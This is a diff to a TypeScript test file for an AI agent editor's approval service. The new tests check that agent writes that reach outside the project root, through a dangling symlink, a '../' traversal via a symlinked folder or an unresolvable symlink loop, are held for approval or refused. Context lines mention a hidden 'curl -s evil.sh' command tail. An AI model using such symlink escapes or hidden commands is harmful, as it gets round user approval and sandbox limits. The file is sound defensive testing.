@@ -1,5 +1,5 @@
 import assert from 'node:assert/strict';
-import { mkdirSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { mkdirSync, mkdtempSync, readFileSync, rmSync, symlinkSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { afterEach, beforeEach, describe, it } from 'node:test';
@@ -513,6 +513,71 @@ describe('EditService: approvals', () => {
       !String(ask?.params.summary).includes('curl -s evil.sh'),
       'the summary alone would have hidden the tail — that is why detail exists',
     );
+  });
+
+  it('asks before a write a dangling symlink carries out of the root', async () => {
+    const denied: string[] = [];
+    // The whole probe end to end: real policy, real canUseTool, real write.
+    const landing = join(outside, 'pwned.sh');
+    const written = join(root, 'deploy');
+    symlinkSync(landing, written);
+    const h = (await run(
+      [
+        { yield: frames.init() },
+        { yield: frames.toolUse('t1', 'Write', { file_path: written }) },
+        toolStep('t1', 'Write', { file_path: written }, () => writeFileSync(written, 'PWNED'), denied),
+        { yield: frames.success('ok') },
+      ],
+      { onEvent: answering(false) },
+    )) as Harness;
+    const asks = h.events.filter((e) => e.event === 'edit.approval');
+    assert.equal(asks.length, 1, 'a write the kernel carries out of the project must be asked about');
+    assert.equal(asks[0]?.params.path, landing, 'and the ask names the file it would really create');
+    assert.equal(denied.length, 1, 'refused in the editor, so it never ran');
+    assert.throws(() => readFileSync(landing, 'utf8'), /ENOENT/, 'no bytes landed outside the root');
+  });
+
+  it('puts the resolved destination on the approval frame, not just the written path', async () => {
+    const denied: string[] = [];
+    mkdirSync(join(root, 'src'), { recursive: true });
+    symlinkSync(outside, join(root, 'src', 'vendor'));
+    const written = `${root}/src/vendor/../secret.txt`;
+    const h = (await run(
+      [
+        { yield: frames.init() },
+        { yield: frames.toolUse('t1', 'Write', { file_path: written }) },
+        toolStep('t1', 'Write', { file_path: written }, () => writeFileSync(written, 'x'), denied),
+        { yield: frames.success('ok') },
+      ],
+      { onEvent: answering(false) },
+    )) as Harness;
+    const ask = h.events.find((e) => e.event === 'edit.approval');
+    assert.equal(ask?.params.path, join(dir, 'secret.txt'), 'the sidecar resolves it, so the float can show it');
+    assert.equal(
+      (ask?.params.detail as { text?: string } | undefined)?.text,
+      written,
+      'while the detail stays the raw string the agent asked for — the two differ, which is the point',
+    );
+  });
+
+  it('refuses one unresolvable path without killing the run', async () => {
+    const denied: string[] = [];
+    // `a -> b/../a`, `b` missing: resolution cannot terminate, and the throw
+    // used to unwind the whole run as an SDK-shaped agent_error.
+    const written = join(root, 'a');
+    symlinkSync(`${root}/b/../a`, written);
+    const h = (await run(
+      [
+        { yield: frames.init() },
+        { yield: frames.toolUse('t1', 'Write', { file_path: written }) },
+        toolStep('t1', 'Write', { file_path: written }, () => writeFileSync(written, 'x'), denied),
+        { yield: frames.success('ok') },
+      ],
+      {},
+    )) as Harness;
+    assert.equal(denied.length, 1, 'the tool call is refused');
+    assert.match(denied[0] ?? '', /could not resolve/);
+    assert.equal(h.events.filter((e) => e.event === 'edit.approval').length, 0, 'and nobody is asked to allow it');
   });
 
   it('reports an answer to an approval that is no longer parked', async () => {
